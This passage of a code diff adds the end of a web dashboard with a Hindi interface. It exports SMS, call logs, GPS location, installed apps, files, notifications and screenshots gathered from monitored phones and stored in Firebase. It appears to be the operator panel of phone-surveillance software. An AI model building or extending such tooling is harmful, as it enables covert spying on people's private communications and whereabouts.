+                // Fallback for older browsers (e.g., IE)
+                if (window.navigator.msSaveBlob) {
+                    window.navigator.msSaveBlob(blob, filename);
+                    showToast(`Data exported to ${filename}`, "success", "Export Successful");
+                } else {
+                    showToast("CSV export not supported by your browser.", "error", "Export Failed");
+                }
+            }
+        }
+        
+        document.querySelectorAll('.export-csv-btn').forEach(button => {
+            button.addEventListener('click', async () => { 
+                const sectionKeyForExport = button.getAttribute('data-section');
+                const originalButtonText = button.innerHTML;
+                button.disabled = true;
+                button.innerHTML = '<span class="spinner-border spinner-border-sm me-1" role="status" aria-hidden="true"></span> डेटा तैयार हो रहा है...';
+
+                try {
+                    let dataToExport = [];
+                    const firebasePathMap = {
+                        'sms': `devices/${currentUID}/sms`,
+                        'calls': `devices/${currentUID}/calls`,
+                        'apps': `devices/${currentUID}/apps`,
+                        'files': `devices/${currentUID}/files`,
+                        'notifications': `devices/${currentUID}/notifications`,
+                        'device-overview': `devices/${currentUID}/info`, 
+                        'battery': `devices/${currentUID}/battery`,
+                        'gps': `devices/${currentUID}/gps`,
+                        'screenshots': `devices/${currentUID}/screenshots`,
+                        'info': `devices/${currentUID}/info` 
+                    };
+
+                    if (!currentUID) {
+                        showToast("कोई डिवाइस चयनित नहीं है।", "error", "त्रुटि");
+                        button.disabled = false;
+                        button.innerHTML = originalButtonText;
+                        return;
+                    }
+
+                    const path = firebasePathMap[sectionKeyForExport];
+
+                    if (!path) {
+                        showToast(`"${sectionKeyForExport}" सेक्शन के लिए एक्सपोर्ट कॉन्फ़िगरेशन नहीं मिला।`, "error", "त्रुटि");
+                        console.error(`Export configuration not found for section: ${sectionKeyForExport}`);
+                        button.disabled = false;
+                        button.innerHTML = originalButtonText;
+                        return;
+                    }
+
+                    const dataRef = ref(database, path);
+                    const snapshot = await get(dataRef); 
+
+                    if (snapshot.exists()) {
+                        const rawData = snapshot.val();
+                        if (typeof rawData === 'object' && rawData !== null) {
+                            if (Array.isArray(rawData)) { 
+                                dataToExport = rawData.map(item => typeof item === 'object' ? item : {value: item});
+                            } else if (['device-overview', 'info', 'battery', 'gps'].includes(sectionKeyForExport)) {
+                                dataToExport = [rawData];
+                            } else if (sectionKeyForExport === 'screenshots') {
+                                let screenshotList = [];
+                                if (Array.isArray(rawData)) {
+                                    screenshotList = rawData.map(item => typeof item === 'string' ? { url: item, timestamp: 'N/A' } : (item || {url: '', timestamp: 'N/A'})).filter(item => item.url);
+                                } else { 
+                                    screenshotList = Object.keys(rawData).map(key => {
+                                        const item = rawData[key];
+                                        const baseItem = typeof item === 'string' ? { url: item, timestamp: 'N/A' } : (item || {url: '', timestamp: 'N/A'});
+                                        return {...baseItem, _fbKey: key};
+                                    }).filter(item => item.url);
+                                }
+                                if (screenshotList.length > 0 && screenshotList.some(s => s.timestamp && s.timestamp !== 'N/A')) {
+                                    screenshotList.sort((a,b) => (b.timestamp || 0) - (a.timestamp || 0)); 
+                                }
+                                dataToExport = screenshotList.map(s => ({
+                                    url: s.url, 
+                                    timestamp: s.timestamp === 'N/A' ? 'N/A' : formatTimestamp(s.timestamp, 'datetime').replace(/<[^>]*>/g, ''),
+                                    firebase_key: s._fbKey || 'N/A'
+                                }));
+                            } else { 
+                                dataToExport = Object.keys(rawData).map(key => ({...rawData[key], _fbKey: key })); // Include Firebase key
+                                
+                                const sortFieldMap = {
+                                    'sms': 'date', 'calls': 'date', 'notifications': 'timestamp', 'files': 'lastModified', 'apps': 'appName'
+                                };
+                                const sortField = sortFieldMap[sectionKeyForExport];
+                                const sortDir = (sectionKeyForExport === 'apps') ? 'asc' : 'desc';
+
+                                if (sortField && dataToExport.length > 0 && dataToExport[0] && dataToExport[0].hasOwnProperty(sortField)) {
+                                     dataToExport.sort((a, b) => {
+                                        const valA = a[sortField] || (sortDir === 'asc' ? Infinity : -Infinity);
+                                        const valB = b[sortField] || (sortDir === 'asc' ? Infinity : -Infinity);
+                                        if (sortDir === 'asc') {
+                                            return String(valA).localeCompare(String(valB), undefined, {numeric: true, sensitivity: 'base'});
+                                        }
+                                        return String(valB).localeCompare(String(valA), undefined, {numeric: true, sensitivity: 'base'});
+                                    });
+                                }
+                            }
+                        } else { // Primitive value at the root
+                            dataToExport = [{ value: rawData }];
+                        }
+                    }
+
+                    if (dataToExport.length > 0) {
+                        dataToExport = dataToExport.map(item => {
+                            const newItem = {...item};
+                            ['date', 'timestamp', 'lastModified', 'lastSeen', 'last_seen'].forEach(field => { // Added last_seen
+                                if (newItem.hasOwnProperty(field) && newItem[field]) { 
+                                    newItem[field] = formatTimestamp(newItem[field], 'datetime').replace(/<[^>]*>/g, '');
+                                }
+                            });
+                            if (newItem.hasOwnProperty('duration')) { 
+                                newItem.duration = formatDuration(newItem.duration).replace(/<[^>]*>/g, '');
+                            }
+                            if(sectionKeyForExport === 'sms' && newItem.hasOwnProperty('type')) {
+                                const typeMap = { 1: 'Inbox', 2: 'Sent', 3: 'Draft', 4: 'Outbox', 5: 'Failed', 6: 'Queued' };
+                                newItem.type = typeMap[newItem.type] || `Unknown (${newItem.type})`;
+                            }
+                            if(sectionKeyForExport === 'calls' && newItem.hasOwnProperty('type')) {
+                                const typeVal = String(newItem.type).toUpperCase();
+                                if (typeVal.includes('INCOMING') || typeVal === '1') newItem.type = 'Incoming';
+                                else if (typeVal.includes('OUTGOING') || typeVal === '2') newItem.type = 'Outgoing';
+                                else if (typeVal.includes('MISSED') || typeVal === '3') newItem.type = 'Missed';
+                                else if (typeVal.includes('REJECTED') || typeVal === '5') newItem.type = 'Rejected';
+                                else if (typeVal.includes('BLOCKED') || typeVal === '6') newItem.type = 'Blocked';
+                                else newItem.type = newItem.type || `Unknown (${newItem.type})`;
+                            }
+                            if(sectionKeyForExport === 'battery' && newItem.hasOwnProperty('isCharging')) {
+                                newItem.isCharging = newItem.isCharging ? 'Yes' : 'No';
+                            }
+                            if(sectionKeyForExport === 'info' || sectionKeyForExport === 'device-overview') {
+                                ['totalRAM', 'availableRAM', 'totalStorage', 'availableStorage'].forEach(key => {
+                                    if (newItem.hasOwnProperty(key) && newItem[key] && !isNaN(parseFloat(newItem[key]))) {
+                                        newItem[key] = formatBytes(parseFloat(newItem[key]));
+                                    }
+                                });
+                                if (newItem.hasOwnProperty('isRooted')) {
+                                   newItem.isRooted = newItem.isRooted ? 'Yes' : 'No';
+                                }
+                            }
+                            return newItem;
+                        });
+                    }
+
+                    if (dataToExport && dataToExport.length > 0) {
+                        const filenameBase = currentUID ? `${currentUID}_` : '';
+                        exportToCSV(dataToExport, `${filenameBase}${sectionKeyForExport}_full_export_${new Date().toISOString().slice(0,10)}.csv`);
+                    } else {
+                         showToast(`"${sectionKeyForExport.replace(/([A-Z])/g, ' $1').replace(/^./, str => str.toUpperCase())}" के लिए एक्सपोर्ट करने हेतु कोई डेटा नहीं मिला।`, "info", "जानकारी");
+                    }
+                } catch (error) {
+                    console.error("एक्सपोर्ट के लिए डेटा प्राप्त करने में त्रुटि:", error);
+                    showToast(`एक्सपोर्ट के लिए डेटा प्राप्त करने में त्रुटि: ${error.message}`, "error", "त्रुटि");
+                } finally {
+                    button.disabled = false;
+                    button.innerHTML = originalButtonText;
+                }
+            });
+        });
+
+        // Initialize: Auth state observer handles the main flow.
+        if (!currentUser) { 
+            loginScreen.style.display = 'block';
+            dashboardScreen.style.display = 'none';
+        }
+        document.querySelector('#sidebar .nav-link[data-section="device-overview"]').classList.add('active');
+        showSection('device-overview-content'); 
+
+        // Custom CSS for badge softness
+        const styleSheet = document.createElement("style");
+        styleSheet.type = "text/css";
+        styleSheet.innerText = `
+            .bg-success-soft { background-color: #D1FAE5 !important; } .text-success-dark { color: #065F46 !important; }
+            .bg-danger-soft { background-color: #FEE2E2 !important; } .text-danger-dark { color: #991B1B !important; }
+            .bg-warning-soft { background-color: #FEF3C7 !important; } .text-warning-dark { color: #92400E !important; }
+            .bg-info-soft { background-color: #CFFAFE !important; } .text-info-dark { color: #0E7490 !important; }
+            .bg-secondary-soft { background-color: #F1F5F9 !important; } .text-secondary-dark { color: #475569 !important; }
+            .bg-dark-soft { background-color: #D1D5DB !important; } /* text-dark is default */
+        `;
+        document.head.appendChild(styleSheet);
+
+    </script>
+</body>
+</html>
